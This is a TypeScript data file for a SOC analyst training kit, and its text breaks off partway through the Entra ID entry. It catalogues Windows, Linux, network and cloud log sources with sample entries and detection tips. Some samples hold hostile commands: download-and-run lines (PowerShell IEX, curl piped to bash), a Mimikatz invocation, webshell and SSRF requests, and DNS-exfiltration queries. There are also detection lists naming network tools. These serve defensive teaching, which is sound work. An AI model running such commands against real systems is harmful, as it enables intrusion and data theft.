/**
 * Log analysis reference for the SOC-prep kit — every log source an analyst
 * touches, grouped by platform, with: what it records, where it lives, a real
 * sample line, how to read the fields, what to look for, and a real scenario.
 *
 * String fields may contain inline HTML (<b>, <code>, <pre>) and are rendered
 * inside .soc-prose containers.
 */
import type { Level } from "./data";

export type Platform = "windows" | "linux" | "network" | "cloud" | "app";

export const PLATFORM_NAMES: Record<Platform, string> = {
  windows: "Windows",
  linux: "Linux",
  network: "Network",
  cloud: "Cloud & Identity",
  app: "Application & Endpoint",
};

export interface LogSource {
  id: number;
  platform: Platform;
  level: Level;
  name: string;
  /** Plain-English: what this log actually records. */
  what: string;
  /** Where it lives and how to open it. */
  where: string;
  /** A representative sample line/entry. */
  sample: string;
  /** How to read it — the fields that matter. */
  fields: string;
  /** What to look for — the suspicious patterns. */
  lookFor: string[];
  /** A real-life scenario where this log was the answer. */
  scenario: string;
}

export const LOG_SOURCES: LogSource[] = [
  /* ============== WINDOWS ============== */
  {
    id: 1,
    platform: "windows",
    level: "l1",
    name: "Security event log — logons (4624 / 4625)",
    what: "<p>Records every successful and failed authentication on the machine — who logged in, from where, and <b>how</b>. This is the single most-read log in any SOC.</p>",
    where:
      "<p>Event Viewer → Windows Logs → <b>Security</b>, or on disk at <code>C:\\Windows\\System32\\winevt\\Logs\\Security.evtx</code>. In a SIEM it is usually the <code>SecurityEvent</code> / <code>WinEventLog:Security</code> table.</p>",
    sample:
      "EventID:        4624\nAccount Name:   svc_backup\nAccount Domain: CORP\nLogon Type:     10\nSource Network Address: 10.14.22.87\nLogon Process:  User32\nAuth Package:   Negotiate\nElevated Token: Yes",
    fields:
      "<p><b>LogonType</b> is the most important field — it tells you <i>how</i> they logged in: 2 = console, 3 = network (SMB/share), 4 = batch/scheduled task, 5 = service, 7 = unlock, 8 = cleartext, 9 = runas /netonly, <b>10 = RDP</b>, 11 = cached. <b>Source Network Address</b> gives you the origin host, and <b>Elevated Token</b> tells you whether it was an admin session.</p>",
    lookFor: [
      "<b>Service accounts with LogonType 10 (RDP)</b> — service accounts should only ever show type 4 or 5.",
      "A burst of <b>4625</b> failures followed by a <b>4624</b> success — brute force that worked.",
      "Type 3 logons <b>workstation-to-workstation</b> — normal users don't connect to each other's PCs.",
      "Type 9 (<code>runas /netonly</code>) on a workstation — a common pivot indicator.",
      "Logons outside the user's normal hours, or from a host they've never used.",
    ],
    scenario:
      "A service account showed a single Type 10 logon at 02:00. The account was valid, the target server was valid, and nothing else looked odd — <b>the logon type was the only anomaly</b>. Its password had been lifted from a config file, and the attacker was RDP'ing in with it. That one field started the whole incident.",
  },
  {
    id: 2,
    platform: "windows",
    level: "l1",
    name: "Security event log — process creation (4688)",
    what: "<p>Records every program that starts, and — when command-line auditing is enabled — <b>the full command line it was started with</b>. This is the backbone of nearly every execution detection.</p>",
    where:
      "<p>Security log. Requires <i>Audit Process Creation</i> plus the GPO setting <b>'Include command line in process creation events'</b>, which is off by default and worth checking on day one.</p>",
    sample:
      'EventID:            4688\nCreator Process:    C:\\Program Files\\Microsoft Office\\WINWORD.EXE\nNew Process Name:   C:\\Windows\\System32\\cmd.exe\nProcess Command Line: cmd.exe /c powershell -nop -w hidden -enc SQBFAF...\nToken Elevation:    TokenElevationTypeLimited',
    fields:
      "<p>Read it as a <b>parent → child</b> pair. <b>Creator Process</b> is the parent, <b>New Process Name</b> is what it launched, and <b>Process Command Line</b> is what actually ran. The parent is usually more incriminating than the child — <code>cmd.exe</code> is normal, <code>WINWORD.EXE → cmd.exe</code> is not.</p>",
    lookFor: [
      "<b>Office apps spawning shells</b> — <code>WINWORD/EXCEL → cmd/powershell/wscript</code> means a macro fired.",
      "<code>powershell -enc</code> / <code>-EncodedCommand</code>, <code>-nop</code>, <code>-w hidden</code> — obfuscated execution.",
      "<b>LOLBins with network arguments</b> — <code>certutil -urlcache</code>, <code>bitsadmin /transfer</code>, <code>mshta http://</code>.",
      "<code>w3wp.exe → cmd.exe</code> on a web server — a webshell.",
      "Processes running from <code>%TEMP%</code>, <code>%APPDATA%</code>, or <code>C:\\Users\\Public</code>.",
    ],
    scenario:
      "An alert fired on a finance workstation: <code>WINWORD.EXE → powershell.exe</code> with a base64 command line. Decoding it revealed a downloader. From alert to confirmed-and-isolated took minutes — <b>on lineage alone</b>, without sandboxing anything.",
  },
  {
    id: 3,
    platform: "windows",
    level: "l2",
    name: "Sysmon — the log you wish Windows had by default",
    what: "<p>A free Microsoft tool that adds far richer telemetry than the native logs: process creation with <b>hashes and parent chains</b>, network connections per process, file creation, registry changes, DLL loads, and process access (LSASS reads).</p>",
    where:
      "<p>Event Viewer → Applications and Services Logs → <b>Microsoft-Windows-Sysmon/Operational</b>. Install with a curated config (SwiftOnSecurity or Olaf Hartong's <i>sysmon-modular</i>) — the default config logs far too much.</p>",
    sample:
      "EventID: 10 (ProcessAccess)\nSourceImage:  C:\\Users\\jsmith\\AppData\\Local\\Temp\\update.exe\nTargetImage:  C:\\Windows\\system32\\lsass.exe\nGrantedAccess: 0x1010\nCallTrace:    UNKNOWN(00007FF9...)|C:\\Windows\\SYSTEM32\\ntdll.dll+...",
    fields:
      "<p>Learn these IDs: <b>1</b> process create (with hash + parent), <b>3</b> network connection, <b>7</b> image/DLL loaded, <b>8</b> CreateRemoteThread (injection), <b>10</b> ProcessAccess (credential dumping), <b>11</b> file created, <b>12/13</b> registry, <b>15</b> alternate data stream, <b>22</b> DNS query. Event 10 with <code>GrantedAccess 0x1010</code> or <code>0x1410</code> against <b>lsass.exe</b> is the classic credential-dump signature.</p>",
    lookFor: [
      "<b>Event 10 targeting lsass.exe</b> from anything that isn't a known security tool — credential theft.",
      "<b>Event 8 (CreateRemoteThread)</b> — process injection.",
      "<b>Event 22</b> DNS queries to newly-registered or algorithmically-generated domains.",
      "<b>Event 3</b> network connections made by processes that should never talk to the internet (e.g. <code>notepad.exe</code>).",
      "<b>Event 1</b> with an unsigned binary running from a user-writable path.",
    ],
    scenario:
      "EDR was quiet, but Sysmon Event 10 showed an unsigned binary in <code>%TEMP%</code> opening LSASS with <code>0x1010</code>. That single event was the ransomware precursor — credential access. Contained in 90 minutes, <b>no encryption ever happened</b>.",
  },
  {
    id: 4,
    platform: "windows",
    level: "l2",
    name: "PowerShell logs (4103 / 4104)",
    what: "<p>Records what PowerShell actually executed. <b>Script Block Logging (4104)</b> is the important one — it logs the <i>deobfuscated</i> code, so even base64/compressed commands are recorded in plain text.</p>",
    where:
      "<p>Applications and Services Logs → Windows PowerShell, and <b>Microsoft-Windows-PowerShell/Operational</b>. Enable Script Block Logging and Module Logging via GPO — both are off by default.</p>",
    sample:
      "EventID: 4104 (Script Block Logging)\nScriptBlockText:\n  IEX (New-Object Net.WebClient).DownloadString('http://185.x.x.x/a.ps1')\n  Invoke-Mimikatz -DumpCreds\nPath: (no file — ran in memory)",
    fields:
      "<p><b>4104</b> = script block executed (the deobfuscated content, with a warning level of <i>Warning</i> when it looks suspicious). <b>4103</b> = pipeline/module execution with parameters. <b>4688</b> shows PowerShell <i>started</i>; 4104 shows <b>what it did</b> — you need both.</p>",
    lookFor: [
      "<code>IEX</code> / <code>Invoke-Expression</code> with <code>DownloadString</code> — download-and-run in memory.",
      "<code>FromBase64String</code>, string concatenation, backticks — obfuscation.",
      "Known offensive tooling: <code>Invoke-Mimikatz</code>, <code>Invoke-WebRequest</code> to raw IPs, <code>Add-MpPreference -ExclusionPath</code> (disabling AV).",
      "<code>-ExecutionPolicy Bypass</code>, <code>-WindowStyle Hidden</code>, <code>-NoProfile</code> together.",
      "Any PowerShell at all on a machine whose user never scripts.",
    ],
    scenario:
      "AV found nothing on disk because the loader was <b>fileless</b>. Script block logging captured the full deobfuscated payload, which revealed a WMI event subscription used for persistence — and gave us the exact string to hunt estate-wide, finding two more infected hosts.",
  },
  {
    id: 5,
    platform: "windows",
    level: "l2",
    name: "System log — service installation (7045 / 4697)",
    what: "<p>Records when a new Windows <b>service</b> is installed. Attackers create services for persistence and for remote execution (PsExec creates one on the target).</p>",
    where: "<p>Event Viewer → Windows Logs → <b>System</b> (7045), and Security (4697) if Audit Security System Extension is enabled.</p>",
    sample:
      'EventID: 7045\nService Name: mtxsvc\nImage Path: %COMSPEC% /c echo aB1 > \\\\.\\pipe\\aB1\nService Type: user mode service\nStart Type:   demand start\nAccount:      LocalSystem',
    fields:
      "<p><b>Image Path</b> is what matters — a legitimate service points to a real executable in Program Files or System32. Look for randomly-named services, paths in <code>%TEMP%</code>, or command interpreters and <b>named pipes</b> in the path (the PsExec signature).</p>",
    lookFor: [
      "<b>Random 8-character service names</b> — PsExec and Cobalt Strike defaults.",
      "Image paths containing <code>cmd.exe /c</code>, <code>powershell</code>, or <code>\\\\.\\pipe\\</code>.",
      "Services running from user-writable directories.",
      "<b>The same service name appearing on multiple hosts within minutes</b> — lateral movement in progress.",
    ],
    scenario:
      "A hunt found identical 7045 events on four servers within a six-minute window. That timing pattern <i>was</i> the lateral movement — mapping the service creation times reconstructed the attacker's exact path back to patient zero.",
  },
  {
    id: 6,
    platform: "windows",
    level: "l2",
    name: "Kerberos & AD logs (4768 / 4769 / 4771 / 4662)",
    what: "<p>Records Active Directory authentication and directory access — ticket requests, failures, and object operations. This is where AD attacks like Kerberoasting and DCSync become visible.</p>",
    where: "<p>Security log <b>on domain controllers</b> (not the workstation). Make sure your SIEM collects from all DCs, not just one.</p>",
    sample:
      "EventID: 4769 (Service Ticket Requested)\nAccount Name:          jsmith@CORP.LOCAL\nService Name:           MSSQLSvc/sql01.corp.local\nTicket Encryption Type: 0x17\nClient Address:         10.14.9.31",
    fields:
      "<p><b>4768</b> = TGT requested (initial login), <b>4769</b> = service ticket requested, <b>4771</b> = pre-auth failed (bad password), <b>4662</b> = directory object operation. <b>TicketEncryptionType</b> <code>0x17</code> is RC4 (weak); <code>0x12</code> is AES. In an AES domain, RC4 requests are a downgrade — the <b>Kerberoasting</b> signature.</p>",
    lookFor: [
      "<b>4769 with 0x17 in an AES domain</b>, especially one account requesting many distinct SPNs quickly.",
      "<b>4662 with the DS-Replication GUIDs</b> (<code>1131f6aa-...</code>) from a non-DC account — DCSync, i.e. domain compromise.",
      "4769 with <b>no preceding 4768</b> — a ticket used that was never issued (Golden Ticket).",
      "4771 spikes across many accounts from one source — password spraying.",
    ],
    scenario:
      "One account requested service tickets for <b>14 different SPNs in 8 minutes</b>, all with RC4. That is not how normal authentication behaves — it was Kerberoasting, harvesting tickets to crack service passwords offline.",
  },
  {
    id: 7,
    platform: "windows",
    level: "l1",
    name: "Account & group changes (4720 / 4728 / 4732 / 4740)",
    what: "<p>Records account lifecycle and privilege changes — accounts created, added to groups, enabled/disabled, and locked out.</p>",
    where: "<p>Security log on the DC (domain accounts) or the local machine (local accounts).</p>",
    sample:
      "EventID: 4728\nSubject Account:  jsmith\nMember:           CN=svc_temp,OU=Service,DC=corp\nGroup Name:       Domain Admins\nGroup Domain:     CORP",
    fields:
      "<p><b>4720</b> account created, <b>4726</b> deleted, <b>4728/4732/4756</b> added to a global/local/universal group, <b>4740</b> locked out, <b>4738</b> account changed. The <b>Subject</b> is who made the change; the <b>Member</b> is who was affected.</p>",
    lookFor: [
      "<b>4720 followed by 4728 to Domain Admins</b> within a short window — a rogue admin being minted.",
      "Group changes made <b>outside the change-management process</b> or by an account that never does user admin.",
      "Account creation outside the joiner process or at unusual hours.",
      "A wave of 4740 lockouts — either a spray attack or a stale credential after a password change.",
    ],
    scenario:
      "A standard user kept regaining admin rights after being removed from every admin group. The 4728 events kept reappearing — the attacker had planted persistence in <b>AdminSDHolder</b>, which silently re-grants rights every hour.",
  },
  {
    id: 8,
    platform: "windows",
    level: "l1",
    name: "Audit log cleared (1102) & log tampering",
    what: "<p>Records that someone <b>wiped the security log</b>. Almost no legitimate process does this.</p>",
    where: "<p>Security log, Event ID <b>1102</b>. Also watch System <b>104</b> (other logs cleared) and any gap in expected log volume.</p>",
    sample:
      "EventID: 1102\nThe audit log was cleared.\nSubject:\n  Account Name: administrator\n  Logon ID:     0x3E7",
    fields:
      "<p>There is very little to read — the value is entirely in <b>the event existing at all</b>. Note the account and the Logon ID so you can pivot to what that session did before and after.</p>",
    lookFor: [
      "<b>Any 1102, ever</b> — treat as an incident until proven to be a documented maintenance action.",
      "A <b>gap</b> in log volume for a host or region that normally reports steadily.",
      "1102 shortly after a suspicious logon — classic anti-forensics.",
    ],
    scenario:
      "An alert fired on 1102 in a region with no workloads. Because the trail was also forwarded off-host, we still had the events — the attacker had blinded only the local copy, and the <b>attempt itself</b> was the tell that started the investigation.",
  },
  {
    id: 9,
    platform: "windows",
    level: "l2",
    name: "Scheduled tasks & WMI persistence",
    what: "<p>Records creation of scheduled tasks and WMI event subscriptions — two of the most common persistence mechanisms, both of which survive reboots.</p>",
    where:
      "<p>Security <b>4698</b> (task created), <b>4702</b> (updated), Microsoft-Windows-TaskScheduler/Operational, and <b>Microsoft-Windows-WMI-Activity/Operational</b> for WMI subscriptions.</p>",
    sample:
      'EventID: 4698\nTask Name: \\Microsoft\\Windows\\UpdateOrchestrator\\SysHealth\nCommand:   C:\\Users\\Public\\svc.exe\nTrigger:   At log on of any user\nRun As:    SYSTEM',
    fields:
      "<p>The task XML in the event contains the <b>Command</b>, <b>Arguments</b>, <b>Trigger</b>, and <b>principal</b>. Attackers mimic Microsoft task names and nest them in legitimate-looking folders — so compare the <i>path</i> of the executable, not the task's name.</p>",
    lookFor: [
      "Tasks whose command points to <code>%TEMP%</code>, <code>%APPDATA%</code>, or <code>C:\\Users\\Public</code>.",
      "Tasks that <b>mimic Microsoft names</b> but run non-Microsoft binaries.",
      "<b>Future-dated or long-delayed triggers</b> — logic bombs and delayed payloads.",
      "WMI <code>__EventFilter</code> + <code>CommandLineEventConsumer</code> pairs — fileless persistence.",
      "Tasks created by an account that has since been deprovisioned.",
    ],
    scenario:
      "A user opened an invoice document and <b>nothing happened for two days</b>. A scheduled task with a delayed trigger was the reason. Hunting that task name across the estate found six more dormant infections that had not yet fired.",
  },

  /* ============== LINUX ============== */
  {
    id: 10,
    platform: "linux",
    level: "l1",
    name: "auth.log / secure — authentication and sudo",
    what: "<p>Records SSH logins, sudo usage, su, and account changes. On Linux this is the equivalent of the Windows Security log and the first file you open.</p>",
    where:
      "<p><code>/var/log/auth.log</code> (Debian/Ubuntu) or <code>/var/log/secure</code> (RHEL/CentOS). On systemd: <code>journalctl -u sshd</code>. <b>Ship it off-host</b> — it is the first thing an intruder edits.</p>",
    sample:
      "Jul 24 02:14:07 web01 sshd[2841]: Failed password for invalid user admin from 45.13.x.x port 51224 ssh2\nJul 24 02:19:44 web01 sshd[2903]: Accepted publickey for deploy from 45.13.x.x port 51890 ssh2: RSA SHA256:kR3n...\nJul 24 02:20:02 web01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash",
    fields:
      "<p>Read the triple: <b>outcome</b> (Failed/Accepted), <b>method</b> (password vs publickey), and <b>source IP</b>. <code>Accepted publickey</code> after a wave of <code>Failed password</code> from the <b>same IP</b> is the shape of a successful intrusion. For sudo lines, <code>USER=root</code> plus <code>COMMAND=</code> shows exactly what was escalated to.</p>",
    lookFor: [
      "<b>Failed password bursts followed by an Accepted line</b> from the same source.",
      "<code>Accepted publickey</code> for a user who normally uses a password — a planted key.",
      "<b>Invalid user</b> attempts (admin, test, oracle) — automated scanning.",
      "sudo to root running a <b>shell</b> rather than a specific command.",
      "Logins from new geographies or at unusual hours, and <code>session opened</code> for accounts that should never log in.",
    ],
    scenario:
      "A web server showed thousands of failed SSH attempts then one <code>Accepted publickey</code>. The key had been appended to <code>authorized_keys</code> weeks earlier — the brute force was noise, and the <b>key was the real door</b>.",
  },
  {
    id: 11,
    platform: "linux",
    level: "l2",
    name: "auditd — syscall-level auditing",
    what: "<p>The deepest Linux logging available: which process made which system call, on which file, as which user. It is what you enable when <code>auth.log</code> is not enough.</p>",
    where:
      "<p><code>/var/log/audit/audit.log</code>. Read it with <code>ausearch</code> and <code>aureport</code> rather than by eye — <code>ausearch -k exec_key -i</code> (the <code>-i</code> interprets the numeric IDs).</p>",
    sample:
      'type=EXECVE msg=audit(1721790847.221:8842): argc=3 a0="curl" a1="-o" a2="/tmp/.x/payload"\ntype=SYSCALL ... success=yes exit=0 uid=33 auid=1002 comm="curl" exe="/usr/bin/curl" key="net_tools"',
    fields:
      "<p><b>auid</b> (audit UID) is the key field — it is the <i>original</i> login user and survives <code>su</code>/<code>sudo</code>, so it attributes actions to a human even after escalation. <b>comm/exe</b> is the binary, <b>key</b> is your own rule label, and <b>success</b> tells you whether it worked.</p>",
    lookFor: [
      "Execution of network tools (<code>curl</code>, <code>wget</code>, <code>nc</code>) by <b>web-server users</b> like www-data.",
      "Writes to <code>/etc/passwd</code>, <code>/etc/shadow</code>, <code>/etc/sudoers</code>, or <code>authorized_keys</code>.",
      "<code>auid</code> of a real user behind actions running as root — who really did it.",
      "Execution from <code>/tmp</code>, <code>/dev/shm</code>, or hidden directories.",
      "<b>Deletion of audit rules</b> or the audit log itself.",
    ],
    scenario:
      "A Linux box showed 100% CPU but <code>top</code> showed nothing — a rootkit was hiding the miner. auditd, which the rootkit hadn't tampered with, recorded the <code>execve</code> of the mining binary from <code>/dev/shm</code>, giving us both the process and the <b>auid</b> of the compromised account.",
  },
  {
    id: 12,
    platform: "linux",
    level: "l1",
    name: "syslog / messages, cron and login records",
    what: "<p>General system activity (services, kernel, errors), scheduled job execution, and the binary login history — the supporting cast around <code>auth.log</code>.</p>",
    where:
      "<p><code>/var/log/syslog</code> or <code>/var/log/messages</code>; <code>/var/log/cron</code>; and the binary files <code>/var/log/wtmp</code> (logins), <code>btmp</code> (failures), <code>lastlog</code> — read those with <code>last</code>, <code>lastb</code>, and <code>lastlog</code>.</p>",
    sample:
      "# last -F\ndeploy   pts/0   45.13.x.x   Wed Jul 24 02:19:44 2026   still logged in\nroot     pts/1   10.0.0.9    Wed Jul 24 01:02:11 2026 - 01:44:52  (00:42)\n\n# /var/log/cron\nJul 24 03:00:01 web01 CROND[3312]: (root) CMD (curl -s http://45.13.x.x/s.sh | bash)",
    fields:
      "<p><code>last</code> shows session start/end and source. A cron line reads <b>(user) CMD (command)</b> — anything piping a download straight into a shell is malicious. Note that <code>wtmp</code> can be edited by an attacker with root, so treat it as supporting, not conclusive, evidence.</p>",
    lookFor: [
      "Cron jobs that <b>download and execute</b> (<code>curl | bash</code>, <code>wget -O- | sh</code>).",
      "<code>@reboot</code> entries and jobs in <code>/etc/cron.d/</code> that no one recognises.",
      "Sessions in <code>last</code> from unexpected IPs, or <b>gaps</b> suggesting wtmp was edited.",
      "Services stopping unexpectedly in syslog — often security agents being killed.",
    ],
    scenario:
      "A crypto-miner kept returning after clean-up. The cron log showed an <code>@reboot</code> entry re-downloading it every boot — removing the binary without removing the <b>cron entry</b> was why it kept coming back.",
  },
  {
    id: 13,
    platform: "linux",
    level: "l2",
    name: "Web server logs (Apache / Nginx)",
    what: "<p>Records every HTTP request to the server — URL, method, status, size, user agent. This is where web attacks (webshells, SQLi, path traversal, SSRF) are visible.</p>",
    where:
      "<p><code>/var/log/nginx/access.log</code> · <code>/var/log/apache2/access.log</code> (and the matching <code>error.log</code>). Parse with <code>awk</code>/<code>grep</code>, or ship into the SIEM.</p>",
    sample:
      '45.13.x.x - - [24/Jul/2026:02:31:07] "POST /uploads/img.php HTTP/1.1" 200 812 "-" "Mozilla/5.0"\n45.13.x.x - - [24/Jul/2026:02:31:44] "GET /uploads/img.php?cmd=whoami HTTP/1.1" 200 34 "-" "curl/7.68"\n10.0.0.5  - - [24/Jul/2026:02:33:02] "GET /api/fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1" 200 1204',
    fields:
      "<p>Read <b>method + path + status + size</b>. A <code>200</code> with a <i>small, varying</i> response size on the same URL repeatedly is command output — a webshell. The <b>user agent</b> matters too: <code>curl</code>/<code>python-requests</code> hitting an app meant for browsers is automation.</p>",
    lookFor: [
      "<b>Requests to files in an uploads directory</b> — especially <code>.php</code>/<code>.jsp</code> that shouldn't be executable there.",
      "<b>URL parameters containing <code>169.254.169.254</code></b> — SSRF against cloud metadata.",
      "Path traversal (<code>../../</code>), SQLi patterns (<code>' OR 1=1</code>), and long encoded strings.",
      "A single IP hitting many 404s then one 200 — enumeration that found something.",
      "POSTs to URLs that only ever receive GETs.",
    ],
    scenario:
      "EDR flagged <code>w3wp.exe</code> spawning <code>cmd.exe</code>. The web access log explained why: a POST had uploaded <code>img.php</code>, and every subsequent request carried a <code>?cmd=</code> parameter. The log gave us both the <b>entry point and the full command history</b>.",
  },

  /* ============== NETWORK ============== */
  {
    id: 14,
    platform: "network",
    level: "l1",
    name: "Firewall logs",
    what: "<p>Records connection attempts at the network edge — source, destination, port, and whether it was allowed or denied. Tells you <i>that</i> something connected, never <i>what</i> was said.</p>",
    where: "<p>Perimeter firewall / cloud NSG / security-group flow logs, shipped into the SIEM.</p>",
    sample:
      "time=02:41:19 action=allow src=10.14.22.87 dst=185.220.x.x dport=443 proto=tcp bytes_out=4211992 bytes_in=8422 duration=1841s\ntime=02:12:03 action=deny  src=45.13.x.x dst=10.14.0.7 dport=3389 proto=tcp",
    fields:
      "<p>The most useful field pair is <b>bytes_out vs bytes_in</b>. Normal browsing downloads more than it uploads; a session with <b>megabytes out and kilobytes in</b> is exfiltration. <b>duration</b> plus a repeating pattern suggests C2 beaconing.</p>",
    lookFor: [
      "<b>Large outbound transfers</b> to unfamiliar destinations, especially outside business hours.",
      "Repeated <b>allow</b> events at a regular interval — beaconing.",
      "Denied inbound scans on 22/3389/445 followed by an <b>allow</b> — something got through.",
      "Internal hosts connecting <b>directly outbound</b> when they should go via the proxy.",
      "Traffic to newly-registered domains, hosting-provider ranges, or Tor exit nodes.",
    ],
    scenario:
      "A weekly beacon hunt found a file server calling out every ~300 seconds with 15% jitter and tiny payloads. The firewall log alone showed the <b>rhythm</b>; EDR then named the process. It was a Cobalt Strike beacon — the precursor to ransomware.",
  },
  {
    id: 15,
    platform: "network",
    level: "l1",
    name: "Proxy / web gateway logs",
    what: "<p>Records the full HTTP(S) request: URL, method, category, content type, file downloaded — and crucially <b>the authenticated username</b>. This is what a firewall log cannot give you.</p>",
    where: "<p>Secure web gateway (Zscaler, Netskope, Bluecoat, Squid) or the corporate proxy, in the SIEM.</p>",
    sample:
      'user=jsmith src=10.14.22.87 method=GET url="https://micros0ft-verify.co/login" category=NewlyRegistered action=allowed status=200 useragent="Mozilla/5.0"\nuser=jsmith method=POST url="https://micros0ft-verify.co/auth" status=200 bytes_sent=412',
    fields:
      "<p>The sequence tells the story: a <b>GET returning 200</b> means the phishing page loaded; a subsequent <b>POST</b> means credentials were submitted. <b>Category</b> and <b>action</b> tell you whether the gateway blocked it. The <b>username</b> is what makes this log the fastest path to scoping a phishing incident.</p>",
    lookFor: [
      "<b>GET then POST</b> to a lookalike domain — credentials entered, not just clicked.",
      "Newly-registered domains, punycode, or typo-squatted brand names.",
      "Downloads of <code>.iso</code>, <code>.img</code>, <code>.hta</code>, <code>.scr</code>, or password-protected archives.",
      "Uploads to personal cloud storage from a corporate account.",
      "Requests with no user agent, or automation user agents from a workstation.",
    ],
    scenario:
      "Twelve users received the same phish. The proxy log showed nine clicked (GET 200) but only <b>two POSTed credentials</b>. That distinction meant two urgent resets instead of twelve — the proxy turned a broad panic into a precise response.",
  },
  {
    id: 16,
    platform: "network",
    level: "l2",
    name: "DNS logs",
    what: "<p>Records every name lookup. Because DNS is almost never blocked, it is both an excellent detection source and a favourite covert channel for attackers.</p>",
    where: "<p>Internal DNS resolvers, Windows DNS debug logging, Sysmon Event 22, or a DNS security service (Umbrella, Defender for DNS).</p>",
    sample:
      "client=10.14.22.87 query=aG93ZHl5b3UuZXhmaWw.data.evil-cdn.net type=TXT\nclient=10.14.22.87 query=bXlwYXNzd29yZA.data.evil-cdn.net type=TXT\nclient=10.14.22.87 query=cdn7-update.xyz type=A  (domain age: 2 days)",
    fields:
      "<p>Look at the <b>subdomain</b>, not just the domain. Long, high-entropy, constantly-changing labels under one parent domain mean data is being encoded into the query itself. <b>Record type</b> matters — heavy <b>TXT</b> or <b>NULL</b> use is abnormal for ordinary browsing.</p>",
    lookFor: [
      "<b>A high count of unique subdomains under one parent domain</b> — the strongest single tunnelling indicator.",
      "One host generating far more DNS than its peers.",
      "Newly-registered parent domains and very low TTLs.",
      "Queries to known DGA patterns or algorithmically-random names.",
      "DNS going <b>direct to external resolvers</b>, bypassing internal DNS.",
    ],
    scenario:
      "One host generated 40× the normal DNS volume with unusually long subdomains. It was <b>data exfiltration over DNS</b> — the payload was base64 in the query labels. Blocking the parent domain and forcing all DNS through inspected resolvers closed it.",
  },
  {
    id: 17,
    platform: "network",
    level: "l2",
    name: "NetFlow / VPC Flow Logs",
    what: "<p>Connection metadata at scale — who talked to whom, on what port, how much data, for how long. No payload, but excellent for spotting patterns across the whole estate.</p>",
    where: "<p>Network devices (NetFlow/IPFIX), AWS VPC Flow Logs, Azure NSG flow logs, GCP VPC Flow Logs.</p>",
    sample:
      "srcaddr=10.14.22.87 dstaddr=10.14.9.31 dstport=445 protocol=6 packets=1204 bytes=1889302 action=ACCEPT\nsrcaddr=10.14.22.87 dstaddr=10.14.9.32 dstport=445 protocol=6 packets=1198 bytes=1877441 action=ACCEPT\nsrcaddr=10.14.22.87 dstaddr=10.14.9.33 dstport=445 protocol=6 packets=1211 bytes=1901220 action=ACCEPT",
    fields:
      "<p>Flow data shines for <b>east-west</b> (internal) analysis. One source hitting <b>many destinations on the same port</b> is scanning or lateral movement. Compare <b>bytes</b> per flow — near-identical sizes to many hosts suggests an automated tool rather than a human.</p>",
    lookFor: [
      "One host connecting to <b>many internal hosts on 445/3389/22</b> — lateral movement or scanning.",
      "Workstation-to-workstation traffic that has no business reason.",
      "Long-lived flows with steady small packets — interactive C2.",
      "Large egress flows to cloud storage or unfamiliar ASNs.",
    ],
    scenario:
      "Flow logs showed one workstation opening SMB sessions to 40 servers in two minutes with nearly identical byte counts. No malware alert had fired — the <b>pattern</b> was the detection, and it was a ransomware operator enumerating shares before deployment.",
  },
  {
    id: 18,
    platform: "network",
    level: "l2",
    name: "IDS / IPS alerts (Suricata, Snort)",
    what: "<p>Signature and protocol-based detection on network traffic — flags known exploit attempts, C2 protocols, and policy violations.</p>",
    where: "<p>Suricata/Snort <code>eve.json</code> or fast.log, or the vendor NDR console, forwarded to the SIEM.</p>",
    sample:
      '{"event_type":"alert","src_ip":"45.13.x.x","dest_ip":"10.14.0.7","dest_port":443,\n "alert":{"signature":"ET MALWARE Cobalt Strike Beacon Observed","category":"Malware C2","severity":1},\n "tls":{"ja3":{"hash":"a0e9f5b4..."}}}',
    fields:
      "<p>Read the <b>signature name and category</b> first, then confirm with context — IDS alone produces false positives. <b>JA3/JA3S</b> TLS fingerprints are valuable because they identify the <i>client software</i> even when the traffic is encrypted.</p>",
    lookFor: [
      "C2 framework signatures (Cobalt Strike, Metasploit, Sliver) — always escalate.",
      "Exploit attempts against internet-facing services, especially matching a current CVE.",
      "<b>Repeated alerts on the same host pair</b> — a single alert may be noise, a pattern is not.",
      "JA3 hashes associated with known malware families.",
    ],
    scenario:
      "An IDS alert for a Cobalt Strike JA3 fingerprint on encrypted traffic gave us the pivot. We could not read the payload, but the <b>TLS fingerprint identified the tooling</b>, and flow logs then showed which internal hosts it had touched.",
  },
  {
    id: 19,
    platform: "network",
    level: "l1",
    name: "VPN logs",
    what: "<p>Records remote access sessions — who connected, from where, when, for how long, and how much data moved.</p>",
    where: "<p>VPN concentrator / SSL-VPN appliance logs (Cisco AnyConnect, Fortinet, Palo Alto GlobalProtect), in the SIEM.</p>",
    sample:
      "user=mchen group=Contractors src=203.0.113.44 geo=RO assigned=10.99.4.18 duration=6h12m bytes_in=88MB bytes_out=2.1GB result=success",
    fields:
      "<p>Correlate the <b>public source IP and geo</b> against the user's normal pattern, and the <b>assigned internal IP</b> so you can follow their activity in other logs. <b>bytes_out</b> that dwarfs bytes_in on a VPN session is a strong exfiltration signal.</p>",
    lookFor: [
      "Connections from countries or ASNs the user has never used — and <b>impossible travel</b> against other logins.",
      "Concurrent sessions for one account from different locations.",
      "Sessions from hosting/VPN provider ranges rather than residential ISPs.",
      "Large outbound volumes, or sessions at unusual hours for that user.",
      "Successful VPN login <b>immediately after</b> a password reset request.",
    ],
    scenario:
      "Threat intel warned that our edge VPN appliance's CVE was being exploited. Before patching, we reviewed VPN logs and found sessions from an unfamiliar ASN using an account that had never logged in remotely — <b>we were already compromised</b>, and patching alone would not have removed them.",
  },

  /* ============== CLOUD & IDENTITY ============== */
  {
    id: 20,
    platform: "cloud",
    level: "l2",
    name: "Entra ID / Azure AD sign-in logs",
    what: "<p>Records every authentication to Microsoft cloud services — location, device, app, MFA outcome, and Conditional Access result. Identity is the modern perimeter, so this is the modern front line.</p>",
    where: "<p>Entra admin centre → Sign-in logs, or the <code>SigninLogs</code> table in Sentinel/Log Analytics.</p>",
    sample:
      'UserPrincipalName: jsmith@corp.com\nIPAddress: 185.220.x.x   Location: Bucharest, RO   ASN: hosting-provider\nAppDisplayName: Office 365 Exchange Online\nResultType: 0 (success)\nAuthenticationRequirement: multiFactorAuthentication\nAuthenticationDetail: "MFA requirement satisfied by claim in the token"',
    fields:
      "<p><b>ResultType</b> 0 is success; <b>50126</b> is bad password (spray indicator); <b>50053</b> is lockout. The critical subtlety is <b>AuthenticationDetail</b> — 'satisfied by claim in the token' means <b>MFA was never actually prompted</b>; a stolen session token was replayed. Also check whether the ASN is a hosting provider rather than a residential ISP.</p>",
    lookFor: [
      "<b>MFA satisfied without a prompt</b> — token replay / adversary-in-the-middle phishing.",
